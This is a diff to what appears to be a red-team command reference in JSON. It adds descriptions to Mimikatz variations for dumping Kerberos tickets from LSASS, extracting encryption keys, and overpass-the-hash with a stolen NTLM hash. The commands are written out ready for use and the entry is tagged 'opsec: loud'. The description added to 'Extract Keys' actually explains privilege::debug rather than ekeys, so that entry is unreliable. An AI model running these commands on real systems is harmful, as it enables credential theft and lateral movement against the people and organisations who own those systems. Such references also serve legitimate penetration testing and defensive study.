@@ -79,15 +79,18 @@
   "variations": [
     {
       "label": "Export Tickets",
-      "command": "privilege::debug\nsekurlsa::tickets /export"
+      "command": "privilege::debug\nsekurlsa::tickets /export",
+      "description": "Exports all Kerberos tickets from LSASS memory. Captures TGTs and service tickets for pass-the-ticket attacks or offline analysis."
     },
     {
       "label": "Extract Keys",
-      "command": "privilege::debug\nsekurlsa::ekeys"
+      "command": "privilege::debug\nsekurlsa::ekeys",
+      "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
     },
     {
       "label": "OverPass the Hash",
-      "command": "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<nt_hash>"
+      "command": "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<nt_hash>",
+      "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
     }
   ],
   "opsec": "loud",
